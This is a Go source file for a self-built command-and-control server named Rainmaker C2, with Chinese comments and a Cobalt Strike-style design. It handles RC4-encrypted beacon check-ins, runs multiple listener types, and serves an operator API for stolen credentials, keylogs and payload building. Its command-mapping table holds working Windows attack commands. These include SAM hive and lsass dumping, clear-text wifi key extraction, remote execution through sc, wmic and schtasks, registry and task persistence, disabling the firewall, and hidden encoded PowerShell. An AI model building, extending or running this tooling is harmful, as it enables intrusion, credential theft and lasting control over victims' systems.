// csdev :: server.go  --  自研 C2 服务端 (Go)
//
// 替代 Python 版: 单文件编译, 无运行时依赖, 高并发。
//
// 协议 (与 kits/beacon/win_beacon.c 严格对齐):
//
//	magic = 0x4B52424B ("KBRK"), RC4 全程加密
//	握手   POST /report  body = [4B magic][4B len][RC4(host|user|arch)]
//	取任务 POST /task    body = [4B magic][4B len=0]
//	     响应           body = [4B magic][4B len][RC4(cmd)]
//	回传   POST /result  body = [4B len][RC4(output)]
//	身份   植入体通过 X-Id 头上报 host|user (不能用源地址: WinHTTP 每次
//	      请求可能使用不同源端口)
//
// 用法:
//
//	server.exe --port 8443
//	server.exe --port 8443 --host 0.0.0.0
package main

import (
	"embed"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"csdev/proto"
)

//go:embed ui.html
var uiFS embed.FS

const protoMagic = 0x4B52424B

var sessionKey = []byte{
	0x91, 0x3a, 0x77, 0xc4, 0x0e, 0x5b, 0xd2, 0x18,
	0x6f, 0xa3, 0x44, 0xbc, 0x27, 0xe8, 0x05, 0x9d,
}

// ---------------------------------------------------------------- RC4
func rc4(data []byte, key []byte) []byte {
	s := make([]byte, 256)
	for i := 0; i < 256; i++ {
		s[i] = byte(i)
	}
	j := 0
	for i := 0; i < 256; i++ {
		j = (j + int(s[i]) + int(key[i%len(key)])) & 0xFF
		s[i], s[j] = s[j], s[i]
	}
	out := make([]byte, len(data))
	i, j := 0, 0
	for n := 0; n < len(data); n++ {
		i = (i + 1) & 0xFF
		j = (j + int(s[i])) & 0xFF
		s[i], s[j] = s[j], s[i]
		out[n] = data[n] ^ s[(int(s[i])+int(s[j]))&0xFF]
	}
	return out
}

// ---------------------------------------------------------------- 会话
type Output struct {
	TS   int64  `json:"ts"`
	Text string `json:"text"`
}

type Session struct {
	ID       string   `json:"sid"`
	Host     string   `json:"host"`
	User     string   `json:"user"`
	Arch     string   `json:"arch"`
	Addr     string   `json:"addr"`
	Ident    string   `json:"-"`
	First    int64    `json:"first_seen"`
	Last     int64    `json:"last_seen"`
	Pending  string   `json:"pending_cmd"`
	HasTask  bool     `json:"has_task"`
	Outputs  []Output `json:"-"`
	mu       sync.Mutex
}

type State struct {
	mu      sync.RWMutex
	byID    map[string]*Session
	byIdent map[string]string
	seq     int
}

var st = &State{byID: map[string]*Session{}, byIdent: map[string]string{}}

func (s *State) getOrCreate(addr, ident string, info map[string]string) *Session {
	s.mu.Lock()
	defer s.mu.Unlock()

	if ident != "" {
		if id, ok := s.byIdent[ident]; ok {
			if sess, ok2 := s.byID[id]; ok2 {
				sess.Last = time.Now().Unix()
				return sess
			}
		}
	}
	s.seq++
	id := fmt.Sprintf("S%03d", s.seq)
	sess := &Session{
		ID: id, Host: info["host"], User: info["user"], Arch: info["arch"],
		Addr: addr, Ident: ident, First: time.Now().Unix(), Last: time.Now().Unix(),
	}
	s.byID[id] = sess
	if ident != "" {
		s.byIdent[ident] = id
	}
	logf("[+] 新会话 %s  %s\\%s  arch=%s  id=%s", id, sess.Host, sess.User, sess.Arch, ident)
	sess.pushOut(base64.StdEncoding.EncodeToString([]byte("[*] 会话建立  " + sess.Host + "\\" + sess.User + "  arch=" + sess.Arch)))
	return sess
}

func (s *State) byIdentLookup(ident string) *Session {
	s.mu.RLock()
	defer s.mu.RUnlock()
	if id, ok := s.byIdent[ident]; ok {
		return s.byID[id]
	}
	return nil
}

func (s *State) list() []*Session {
	s.mu.RLock()
	defer s.mu.RUnlock()
	out := make([]*Session, 0, len(s.byID))
	for _, v := range s.byID {
		out = append(out, v)
	}
	return out
}

func (s *Session) pushOut(text string) {
	s.mu.Lock()
	s.Outputs = append(s.Outputs, Output{TS: time.Now().UnixNano(), Text: text})
	s.mu.Unlock()
}

func (s *Session) drain(since int64) []Output {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := []Output{}
	for _, o := range s.Outputs {
		if o.TS >= since {
			out = append(out, o)
		}
	}
	return out
}

// ---------------------------------------------------------------- 命令别名
// 与 Python 版一致: 绝大多数 C2 命令本质是 shell 组合, 在服务端映射,
// 植入体零改动即可支持上百条命令。
var nativePrefix = []string{"download ", "upload "}

func psexec(r string) string {
	p := strings.SplitN(r, " ", 2)
	if len(p) == 0 || p[0] == "" {
		return "echo usage: psexec <host> <cmd>"
	}
	host := p[0]
	cmd := "cmd.exe"
	if len(p) > 1 {
		cmd = p[1]
	}
	return fmt.Sprintf(`sc \\%s create csdsvc binPath= "cmd /c %s" start= demand & sc \\%s start csdsvc & timeout /t 3 >nul & sc \\%s delete csdsvc`,
		host, cmd, host, host)
}

func mapCommand(cmd string) string {
	c := strings.TrimSpace(cmd)
	if c == "" {
		return c
	}
	low := strings.ToLower(c)

	// 原生命令透传。只能用精确匹配: 若对 "ps" 用前缀匹配, psexec/psh 会被误判
	if low == "ps" || low == "exit" {
		return c
	}
	for _, p := range nativePrefix {
		if strings.HasPrefix(low, p) {
			return c
		}
	}

	parts := strings.SplitN(c, " ", 2)
	verb := strings.ToLower(parts[0])
	rest := ""
	if len(parts) > 1 {
		rest = strings.TrimSpace(parts[1])
	}
	q := `"` + rest + `"`

	switch verb {
	// ---- 文件 ----
	case "pwd":
		return "cd"
	case "ls", "ll":
		if rest != "" {
			return "dir /a " + q
		}
		return "dir /a"
	case "cat", "type":
		return "type " + q
	case "head":
		return fmt.Sprintf(`powershell -c "Get-Content '%s' -TotalCount 20"`, rest)
	case "tail":
		return fmt.Sprintf(`powershell -c "Get-Content '%s' -Tail 20"`, rest)
	case "rm":
		return "del /f /q " + q
	case "cp":
		return `copy /y "` + strings.Replace(rest, " ", `" "`, 1) + `"`
	case "mv":
		return `move /y "` + strings.Replace(rest, " ", `" "`, 1) + `"`
	case "mkdir":
		return "mkdir " + q
	case "rmdir":
		return "rmdir /s /q " + q
	case "find":
		return "dir /s /b " + q
	case "search":
		return fmt.Sprintf(`findstr /s /i /m "%s" *`, rest)
	case "hash":
		return "certutil -hashfile " + q + " SHA256"
	// ---- 进程 ----
	case "kill":
		return "taskkill /F /PID " + rest
	case "tasklist":
		return "tasklist /v"
	case "services":
		return "sc query type= service state= all"
	case "drivers":
		return "driverquery /v"
	// ---- 系统 ----
	case "whoami":
		return "whoami /all"
	case "sysinfo":
		return "systeminfo"
	case "env":
		return "set"
	case "date":
		return "date /t & time /t"
	case "uptime":
		return "net statistics workstation | findstr /i since"
	case "drives":
		return "wmic logicaldisk get name,size,freespace,caption"
	case "hotfix":
		return "wmic qfe get hotfixid,installedon"
	case "av":
		return `wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName,productState`
	// ---- 网络 ----
	case "ipconfig", "ifconfig":
		return "ipconfig /all"
	case "netstat":
		return "netstat -ano"
	case "arp":
		return "arp -a"
	case "route":
		return "route print"
	case "dns":
		return "ipconfig /displaydns"
	case "ping":
		return "ping -n 4 " + rest
	case "tracert":
		return "tracert -h 5 " + rest
	case "firewall":
		return "netsh advfirewall show allprofiles"
	// ---- 账户 / 域 ----
	case "users":
		return "net user"
	case "groups":
		return "net localgroup"
	case "shares":
		return "net share"
	case "sessions":
		return "net session"
	case "domains":
		return "net view /domain"
	case "dc":
		return "nltest /dclist:"
	case "trust":
		return "nltest /domain_trusts"
	// ---- 凭据 ----
	case "wifi":
		return "netsh wlan show profiles"
	case "wifikey":
		return fmt.Sprintf(`netsh wlan show profile "%s" key=clear`, rest)
	case "clip":
		return "powershell -c Get-Clipboard"
	case "clipset":
		return fmt.Sprintf(`powershell -c "Set-Clipboard '%s'"`, rest)
	case "savedcred":
		return "cmdkey /list"
	case "history":
		return `powershell -c "Get-Content (Get-PSReadlineOption).HistorySavePath"`
	case "sam", "hashdump":
		// 仅 v1 (legacy) 会话会走到这里。
		// v2 会话的 hashdump 在 v2SendCommand 里就被 isHashdumpCommand 拦下,
		// 改走"导出 -> 分块回传 hive -> 服务端离线解析出 NTLM"的完整链路
		// (见 v2_hashdump.go)。v1 没有分块回传通道, 所以这里保留原行为:
		// 只把 hive 落到目标机 %TEMP% 并列出, 不做解析。
		return `reg save HKLM\SAM %TEMP%\s.hiv /y & reg save HKLM\SYSTEM %TEMP%\y.hiv /y & dir %TEMP%\*.hiv`
	case "vault":
		return `vaultcmd /listcreds:"Windows Credentials" /all`
	case "credman":
		return "cmdkey /list"
	case "dpapi":
		return `dir /a %APPDATA%\Microsoft\Credentials`
	case "chrome":
		return `dir /b "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" 2>nul || echo not found`
	case "edge":
		return `dir /b "%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data" 2>nul || echo not found`
	case "regquery":
		if rest == "" {
			rest = `HKLM\Software`
		}
		return "reg query " + rest + " /s"
	case "regsave":
		return "reg save " + rest + " %TEMP%\\reg.hiv /y"
	case "procdump":
		return `procdump64.exe -accepteula -ma lsass.exe %TEMP%\l.dmp 2>nul || echo procdump not present`
	case "lsass":
		return `powershell -c "Get-Process lsass | Select-Object Id,ProcessName"`
	// ---- 横向移动 ----
	case "psexec":
		return psexec(rest)
	case "wmiexec":
		pp := strings.SplitN(rest, " ", 2)
		h, cmd := "", ""
		if len(pp) > 0 {
			h = pp[0]
		}
		if len(pp) > 1 {
			cmd = pp[1]
		}
		if h == "" {
			return "echo usage: wmiexec <host> <cmd>"
		}
		return fmt.Sprintf(`wmic /node:"%s" process call create "cmd.exe /c %s"`, h, cmd)
	case "atexec":
		pp := strings.SplitN(rest, " ", 2)
		h, cmd := "", ""
		if len(pp) > 0 {
			h = pp[0]
		}
		if len(pp) > 1 {
			cmd = pp[1]
		}
		if h == "" {
			return "echo usage: atexec <host> <cmd>"
		}
		return fmt.Sprintf(`schtasks /s %s /create /tn csdtask /tr "cmd /c %s" /sc once /st 00:00 & schtasks /s %s /run /tn csdtask`, h, cmd, h)
	case "netuse":
		return `net use \\` + rest + `\admin$`
	case "netdel":
		return `net use \\` + rest + `\admin$ /del`
	case "netview":
		return `net view \\` + rest
	case "share":
		return `net view \\` + rest + ` /all`
	case "loggedon", "quser":
		if rest != "" {
			return "query user /server:" + rest
		}
		return "query user"
	case "qprocess":
		if rest != "" {
			return "query process /server:" + rest
		}
		return "query process"
	case "rdp":
		return `reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & netsh advfirewall firewall set rule group="remote desktop" new enable=Yes`
	case "svc_start":
		return "sc start " + rest
	case "svc_stop":
		return "sc stop " + rest
	case "svc_query":
		return "sc query " + rest
	case "svc_delete":
		return "sc delete " + rest
	case "svc_create":
		return fmt.Sprintf(`sc create csdsvc binPath= "%s"`, rest)
	// ---- 持久化 ----
	case "persist_reg":
		return fmt.Sprintf(`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WndSvc /t REG_SZ /d "%s" /f`, rest)
	case "persist_reg2":
		return fmt.Sprintf(`reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v WndSvc /t REG_SZ /d "%s" /f`, rest)
	case "persist_task":
		return fmt.Sprintf(`schtasks /create /tn WndSvc /tr "%s" /sc onlogon /rl highest /f`, rest)
	case "persist_task_h":
		return fmt.Sprintf(`schtasks /create /tn WndSvc /tr "%s" /sc minute /mo 30 /f`, rest)
	case "persist_svc":
		return fmt.Sprintf(`sc create WndSvc binPath= "%s" start= auto & sc start WndSvc`, rest)
	case "persist_startup":
		return fmt.Sprintf(`copy /y "%s" "%%APPDATA%%\Microsoft\Windows\Start Menu\Programs\Startup\WndSvc.exe"`, rest)
	case "persist_list":
		return `echo [Run keys] & reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" & reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" & echo [Tasks] & schtasks /query /fo LIST | findstr /i "TaskName"`
	case "persist_clean":
		return `reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WndSvc /f 2>nul & reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v WndSvc /f 2>nul & schtasks /delete /tn WndSvc /f 2>nul & sc delete WndSvc 2>nul & echo done`
	// ---- 代理 / 转发 ----
	case "portfwd":
		pp := strings.Fields(rest)
		if len(pp) < 2 {
			return "echo usage: portfwd <lport> <raddr:rport>"
		}
		ra := strings.SplitN(pp[1], ":", 2)
		rp := ""
		if len(ra) > 1 {
			rp = ra[1]
		}
		return fmt.Sprintf("netsh interface portproxy add v4tov4 listenport=%s connectaddress=%s connectport=%s", pp[0], ra[0], rp)
	case "portfwd_del":
		return "netsh interface portproxy delete v4tov4 listenport=" + rest
	case "portfwd_list":
		return "netsh interface portproxy show all"
	case "portscan":
		return fmt.Sprintf(`powershell -c "$t='%s';$h,$p=$t.Split(':');1..1024 | %%{ $c=New-Object Net.Sockets.TcpClient; try{$c.Connect($h,$_);Write-Output ('open '+$_);$c.Close()}catch{} }"`, rest)
	case "fw_off":
		return "netsh advfirewall set allprofiles state off"
	case "fw_on":
		return "netsh advfirewall set allprofiles state on"
	case "fw_list":
		return "netsh advfirewall firewall show rule name=all"
	// ---- 注入 / 执行 ----
	case "psh":
		return fmt.Sprintf(`powershell -nop -w hidden -c "%s"`, rest)
	case "psh_enc":
		return "powershell -nop -w hidden -enc " + rest
	case "rundll":
		return "rundll32 " + rest
	case "regsvr":
		return "regsvr32 /s " + rest
	case "execute_assembly":
		return fmt.Sprintf(`powershell -c "$b=[IO.File]::ReadAllBytes('%s');[Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,@())"`, rest)
	case "elevate":
		return fmt.Sprintf(`powershell -c "Start-Process -Verb RunAs -FilePath '%s'"`, rest)
	case "inject_ps":
		return fmt.Sprintf(`powershell -c "$b=[Convert]::FromBase64String('%s');[Reflection.Assembly]::Load($b) | Out-Null; Write-Output 'loaded'"`, rest)
	// ---- 操作 ----
	case "screenshot":
		return `powershell -c "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;$s=[Windows.Forms.SystemInformation]::VirtualScreen;$b=New-Object Drawing.Bitmap $s.Width,$s.Height;$g=[Drawing.Graphics]::FromImage($b);$g.CopyFromScreen($s.Left,$s.Top,0,0,$b.Size);$p=$env:TEMP+'\'+[guid]::NewGuid().ToString('N').Substring(0,8)+'.png';$b.Save($p);Write-Output $p"`
	case "msg":
		return "msg * " + rest
	case "shell":
		return rest
	case "sleep":
		return "sleep " + rest
	case "clear":
		return "cls"
	// ---- 电源 ----
	case "shutdown":
		return "shutdown /s /t 0"
	case "reboot":
		return "shutdown /r /t 0"
	case "logoff":
		return "shutdown /l"
	case "lock":
		return "rundll32 user32.dll,LockWorkStation"
	}
	return c
}

// ---------------------------------------------------------------- 工具
func logf(f string, a ...interface{}) {
	log.Printf(f, a...)
}

// Windows 命令输出多为 GBK/OEM 编码。Go 标准库不含 GBK 解码器,
// 因此原样以 base64 传出, 由浏览器用 TextDecoder("gbk") 解码 —— 浏览器
// 原生支持 GBK, 无需引入第三方依赖。
func decodeOut(b []byte) string {
	return base64.StdEncoding.EncodeToString(b)
}

// 握手信息用明文 (不能走 base64: 它是 "host|user|arch" 需按 | 分割)
func decodePlain(b []byte) string {
	return string(b)
}

func writeJSON(w http.ResponseWriter, v interface{}) {
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	json.NewEncoder(w).Encode(v)
}

// ---------------------------------------------------------------- HTTP
func handleReport(w http.ResponseWriter, r *http.Request) {
	body, _ := io.ReadAll(r.Body)
	if len(body) < 8 {
		w.Write([]byte{})
		return
	}
	magic := binary.BigEndian.Uint32(body[0:4])
	ln := binary.BigEndian.Uint32(body[4:8])
	if magic != protoMagic || ln == 0 || int(ln) > len(body)-8 {
		w.Write([]byte{})
		return
	}
	plain := rc4(body[8:8+ln], sessionKey)
	parts := strings.SplitN(decodePlain(plain), "|", 3)
	info := map[string]string{"host": "?", "user": "?", "arch": "?"}
	if len(parts) > 0 {
		info["host"] = parts[0]
	}
	if len(parts) > 1 {
		info["user"] = parts[1]
	}
	if len(parts) > 2 {
		info["arch"] = parts[2]
	}
	st.getOrCreate(r.RemoteAddr, r.Header.Get("X-Id"), info)
	w.Write([]byte("OK"))
}

func handleTask(w http.ResponseWriter, r *http.Request) {
	io.ReadAll(r.Body)
	sess := st.byIdentLookup(r.Header.Get("X-Id"))
	if sess == nil {
		w.Write([]byte{})
		return
	}
	sess.Last = time.Now().Unix()

	sess.mu.Lock()
	cmd := sess.Pending
	sess.Pending = ""
	sess.HasTask = false
	sess.mu.Unlock()

	if cmd == "" {
		w.Write([]byte{})
		return
	}
	payload := rc4([]byte(cmd), sessionKey)
	hdr := make([]byte, 8)
	binary.BigEndian.PutUint32(hdr[0:4], protoMagic)
	binary.BigEndian.PutUint32(hdr[4:8], uint32(len(payload)))
	logf("[>] %s <- %s", sess.ID, cmd)
	w.Write(append(hdr, payload...))
}

func handleResult(w http.ResponseWriter, r *http.Request) {
	body, _ := io.ReadAll(r.Body)
	if len(body) < 4 {
		w.Write([]byte{})
		return
	}
	ln := binary.BigEndian.Uint32(body[0:4])
	if ln == 0 || int(ln) > len(body)-4 {
		w.Write([]byte{})
		return
	}
	out := decodeOut(rc4(body[4:4+ln], sessionKey))
	if sess := st.byIdentLookup(r.Header.Get("X-Id")); sess != nil {
		sess.pushOut(out)
		logf("[<] %s 回传 %d 字节", sess.ID, ln)
	}
	w.Write([]byte("OK"))
}

// ---------------------------------------------------------------- Web API
func handleSessions(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, map[string]interface{}{"ok": true, "sessions": sessionsRows()})
}

func handleOutput(w http.ResponseWriter, r *http.Request) {
	sid := r.URL.Query().Get("sid")
	since, _ := strconv.ParseInt(r.URL.Query().Get("since"), 10, 64)
	if v2TryOutput(w, sid, since) {
		return
	}
	st.mu.RLock()
	s := st.byID[sid]
	st.mu.RUnlock()
	if s == nil {
		writeJSON(w, map[string]interface{}{"ok": false, "error": "no such session"})
		return
	}
	writeJSON(w, map[string]interface{}{"ok": true, "items": s.drain(since)})
}

func handleCommand(w http.ResponseWriter, r *http.Request) {
	var req struct {
		SID string `json:"sid"`
		Cmd string `json:"cmd"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, map[string]interface{}{"ok": false, "error": "bad json"})
		return
	}
	// Aggressor 风格脚本命令优先 (只拦截脚本注册过的命令名)
	if scriptTryCommand(w, req.SID, req.Cmd) {
		return
	}
	// 服务端侧作业命令 (jobs / jobkill)
	if jobTryCommand(w, req.SID, req.Cmd) {
		return
	}
	if v2TryCommand(w, req.SID, req.Cmd) {
		return
	}
	st.mu.RLock()
	s := st.byID[req.SID]
	st.mu.RUnlock()
	if s == nil {
		writeJSON(w, map[string]interface{}{"ok": false, "error": "no such session"})
		return
	}
	mapped := mapCommand(req.Cmd)
	s.mu.Lock()
	s.Pending = mapped
	s.HasTask = true
	s.mu.Unlock()
	s.pushOut(base64.StdEncoding.EncodeToString([]byte("> " + req.Cmd)))
	logf("[>] %s 下发: %s", req.SID, req.Cmd)
	writeJSON(w, map[string]interface{}{"ok": true, "mapped": mapped})
}

func handleUI(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" && r.URL.Path != "/index.html" {
		http.NotFound(w, r)
		return
	}
	b, err := uiFS.ReadFile("ui.html")
	if err != nil {
		http.Error(w, "ui missing", 500)
		return
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write(b)
}

// ---------------------------------------------------------------- main
// consoleRoute 一个需要操作员令牌的控制台接口。
type consoleRoute struct {
	path string
	h    http.HandlerFunc
}

// consoleRoutes 控制台接口清单 —— 这里的每一条都会被套上 requireAuth。
//
// 为什么要把清单提出来集中管理: 这些端点会吐出会话列表、凭据、键盘记录、截屏、
// 下载文件、目标库整个数据集, 也能下发命令 / 生成载荷 / 起监听器 / 终止全部会话。
// 之前它们是逐条裸注册的, 默认的 -auth=on 根本拦不住 —— 未登录也能全部拉到,
// 是个真缺口。集中成一份清单以后, 测试可以遍历它做"未登录一律 401"的反向断言,
// 以后新增接口忘了套认证会直接测失败。
//
// **植入体通道绝不能进这张表**: /submit /report /task /result 以及 profile 声明的
// URI 池走的是植入体自己的 RSA/AES 会话密钥, 手里没有操作员令牌, 套上 requireAuth
// 等于所有植入体一起掉线。
//
// 旁路模式 (-auth=off) 下 requireAuth 内部直接放行 (AuthEnabled()==false),
// 单机调试体验完全不变; 只有默认的 -auth=on 才真正要求令牌。
var consoleRoutes = []consoleRoute{
	{"/api/state", handleState},
	{"/api/scripts", handleScripts},
	{"/api/jobs", handleJobs},
	{"/api/plugins", handlePlugins},
	{"/api/plugin/set", handlePluginSet},
	{"/api/script/run", handleScriptRun},
	{"/api/script/menu", handleScriptMenu},
	{"/api/sessions", handleSessions},
	{"/api/output", handleOutput},
	{"/api/command", handleCommand},
	{"/api/session/info", handleSessionInfo},
	{"/api/session/sleep", handleSessionSleep},
	{"/api/session/exit", handleSessionExit},
	{"/api/session/checkin", handleSessionCheckin},
	{"/api/credentials", handleCredentials},
	{"/api/downloads", handleDownloads},
	{"/api/download/file", handleDownloadFile},
	{"/api/screenshots", handleScreenshots},
	{"/api/screenshot/file", handleScreenshotFile},
	{"/api/keylogs", handleKeylogs},
	{"/api/eventlog", handleEventlog},
	{"/api/listeners", handleListeners},
	{"/api/listener/add", handleListenerAdd},
	{"/api/listener/remove", handleListenerRemove},
	{"/api/listeners/selftest", func(w http.ResponseWriter, r *http.Request) {
		writeJSON(w, listenerSelfCheck())
	}},
	{"/api/payload/formats", handlePayloadFormats},
	{"/api/payload/build", handlePayloadBuild},
	{"/api/killall", handleKillAll},
	{"/api/targets", handleTargets},
	{"/api/targets/csv", handleTargetsCSV},
}

// registerConsoleRoutes 把 consoleRoutes 全部注册到 mux, 逐条套 requireAuth。
func registerConsoleRoutes(mux *http.ServeMux) {
	for _, c := range consoleRoutes {
		mux.HandleFunc(c.path, requireAuth(c.h))
	}
}

func main() {
	host := flag.String("host", "0.0.0.0", "监听地址")
	port := flag.Int("port", 8443, "监听端口")
	emitPub := flag.String("emit-pubkey", "", "导出植入体公钥 C 头文件到指定路径后退出")
	showKey := flag.Bool("show-key", false, "打印公钥指纹后退出")
	profilePath := flag.String("profile", "", "Malleable C2 profile 路径 (留空则自动探测 profiles/csdev.profile)")
	tcpAddr := flag.String("tcp", "", "额外启用 TCP reverse listener, 格式 ip:port (如 0.0.0.0:8444)")
	smbPipe := flag.String("smb", "", "额外启用 SMB 命名管道 listener, 如 \\\\.\\pipe\\csdev_pipe")
	scriptFlag := flag.String("scripts", "", "附加加载的 Aggressor 风格脚本 (.cna), 逗号分隔")
	pluginDir := flag.String("plugins-dir", "", "可选插件包目录(在 GUI/API 里挑选加载), 例如 CS 的 plugin 目录")
	pluginSel := flag.String("plugin", "", "启动时加载的插件包(目录或 .cna 文件), 逗号分隔; 覆盖已保存的选择")
	dnsAddr := flag.String("dns", "", "额外启用 DNS listener, 如 0.0.0.0:5353 (生产用 53 需特权)")
	extc2Addr := flag.String("extc2", "", "额外启用 External C2 listener (第三方中转接入点), 如 0.0.0.0:9100")
	tlsFlag := flag.Bool("tls", false, "主 listener 改用 HTTPS (自签名证书, 首次启动自动生成到 data/)")
	flag.Parse()

	addr := fmt.Sprintf("%s:%d", *host, *port)
	serverAddr = addr

	// 路径与存储初始化
	devRoot = findDevRoot()
	dataDir = filepath.Join(devRoot, "data")
	downloadDir = filepath.Join(devRoot, "downloads")
	screenshotDir = filepath.Join(devRoot, "screenshots")
	storeFile = filepath.Join(dataDir, "store.jsonl")
	_ = os.MkdirAll(dataDir, 0o755)
	storeLoad()

	// Aggressor 风格脚本运行时
	//   scripts/*.cna 始终加载(自研脚本) + --scripts 附加 + 选中的插件包(data/plugins.json)
	{
		extra := []string{}
		if *scriptFlag != "" {
			for _, p := range strings.Split(*scriptFlag, ",") {
				p = strings.TrimSpace(p)
				if p != "" {
					extra = append(extra, p)
				}
			}
		}
		if *pluginDir != "" {
			// 只设置根目录: 不要在这里 save, 否则会把还没读回来的
			// 已选集合(pluginLoadState 还没跑)写成空数组, 覆盖持久化文件。
			pluginSetRoot(*pluginDir)
		}
		if *pluginSel != "" {
			var paths []string
			for _, p := range strings.Split(*pluginSel, ",") {
				p = strings.TrimSpace(p)
				if p != "" {
					paths = append(paths, p)
				}
			}
			pluginState.mu.Lock()
			pluginState.selected = paths
			pluginState.mu.Unlock()
			pluginSaveState()
		}
		initAggressor(extra)
	}

	// RSA 密钥对 (首次运行自动生成)
	if err := proto.GenerateKeypair(dataDir); err != nil {
		logf("[!] 密钥对生成失败: %v", err)
	}
	priv, err := proto.LoadKeypair(dataDir)
	if err != nil {
		fmt.Fprintln(os.Stderr, "加载密钥失败:", err)
		os.Exit(1)
	}
	pubBlob := proto.PublicKeyBlob(&priv.PublicKey)

	if *showKey {
		fmt.Printf("公钥指纹: %s\n", pubkeyFingerprint(pubBlob))
		fmt.Printf("PUBLICKEYBLOB: %d 字节\n", len(pubBlob))
		return
	}
	if *emitPub != "" {
		if err := proto.EmitPubkeyHeader(*emitPub, pubBlob); err != nil {
			fmt.Fprintln(os.Stderr, "导出失败:", err)
			os.Exit(1)
		}
		fmt.Printf("已导出公钥头文件: %s (%d 字节)\n", *emitPub, len(pubBlob))
		return
	}

	vl := &VPListener{Priv: priv, Name: "csdev-v2", Addr: addr}

	// Malleable profile: 决定植入体入口路径与应答头
	{
		p := *profilePath
		if p == "" {
			auto := filepath.Join(devRoot, "profiles", "csdev.profile")
			if _, err := os.Stat(auto); err == nil {
				p = auto
			}
		}
		if p != "" {
			if err := loadProfileFile(p); err != nil {
				logf("[!] profile 加载失败: %v (回落到默认 /submit)", err)
			}
		}
	}

	registerMainListener("csdev-v2", pickType(*port), "v2", *host, *port, "/submit", *tlsFlag)
	registerMainListener("csdev-legacy", pickType(*port), "v1", *host, *port, "/report", *tlsFlag)

	mux := http.NewServeMux()

	// ---- 植入体接口 ----
	mux.HandleFunc("/submit", vl.handleSubmit) // v2 统一入口
	mux.HandleFunc("/report", handleReport)    // v1 legacy
	mux.HandleFunc("/task", handleTask)
	mux.HandleFunc("/result", handleResult)
	// profile 声明的附加入口 (URI 池)
	for _, u := range profileURIs() {
		if u == "/submit" || u == "/" {
			continue
		}
		mux.HandleFunc(u, vl.handleSubmit)
		logf("  profile 入口: %s", u)
	}

	// ---- 控制台 API ----
	// 统一走 registerConsoleRoutes 套 requireAuth。清单在 consoleRoutes, 说明也在那里。
	registerConsoleRoutes(mux)
	// 认证与报告的路由此前只在单元测试里注册过, main 里漏接线 —— 补上。
	// 注意: RegisterAuthRoutes 只注册 /api/login|logout|users, 不会给既有端点加保护;
	// 需要保护时用 requireAuth 包装 (见 auth.go 顶部说明)。
	RegisterAuthRoutes(mux)
	RegisterReportRoutes(mux)
	RegisterProxyRoutes(mux)
	mux.HandleFunc("/", handleUI)

	logf("Rainmaker C2 服务端 (Go)  —  协议 v1(legacy) + v2(RSA/AES/HMAC)")
	logf("  Web UI : http://%s/", func() string {
		if *host == "0.0.0.0" {
			return fmt.Sprintf("127.0.0.1:%d", *port)
		}
		return addr
	}())
	logf("  v2 入口: http://%s/submit", addr)
	logf("  v1 入口: http://%s/report", addr)

	// 可选承载层 (--tcp/--smb/--dns/--extc2)
	// 与 REST 的 /api/listener/add 走**同一条注册路径** (listener_admin.go),
	// 因此它们同样出现在 /api/listeners 里, 也能被 /api/listener/remove 删除。
	listenerPriv = priv
	for _, f := range []struct{ kind, spec string }{
		{"tcp", *tcpAddr},
		{"smb", *smbPipe},
		{"dns", *dnsAddr},
		{"extc2", *extc2Addr},
	} {
		if err := addFromFlag(f.kind, f.spec); err != nil {
			logf("[!] %s listener 启动失败: %v", strings.ToUpper(f.kind), err)
		}
	}
	logf("  公钥指纹: %s", pubkeyFingerprint(pubBlob))
	logf("  v1 RC4 : %x", sessionKey)

	srv := &http.Server{
		Addr:              addr,
		Handler:           mux,
		ReadHeaderTimeout: 10 * time.Second,
	}

	// 主入口 (控制台) 在启动期固化: mux / profile URI 池 / TLS 证书都在这里确定,
	// 所以 HTTP(S) **不提供**运行期新增 (见 listener_admin.go 的 kind=http 分支)。
	if *tlsFlag {
		certPath, keyPath, cerr := ensureSelfSignedCert(dataDir)
		if cerr != nil {
			logf("[!] TLS 证书准备失败, 回退 HTTP: %v", cerr)
			if err := srv.ListenAndServe(); err != nil {
				logf("[!] 主 listener 启动失败: %v", err)
				fmt.Fprintln(os.Stderr, "启动失败:", err)
				os.Exit(1)
			}
			return
		}
		logf("  HTTPS 入口: https://%s/submit  (植入体需 -DC2_SSL=1)", addr)
		logf("  运行期可用 POST /api/listener/add 增删 tcp/smb/dns/extc2 承载 listener")
		if err := srv.ListenAndServeTLS(certPath, keyPath); err != nil {
			logf("[!] 主 listener 启动失败: %v", err)
			fmt.Fprintln(os.Stderr, "启动失败:", err)
			os.Exit(1)
		}
		return
	}

	logf("  运行期可用 POST /api/listener/add 增删 tcp/smb/dns/extc2 承载 listener")
	if err := srv.ListenAndServe(); err != nil {
		logf("[!] 主 listener 启动失败: %v", err)
		fmt.Fprintln(os.Stderr, "启动失败:", err)
		os.Exit(1)
	}
}

func pickType(port int) string {
	if port == 443 || port == 8443 {
		return "https"
	}
	return "http"
}
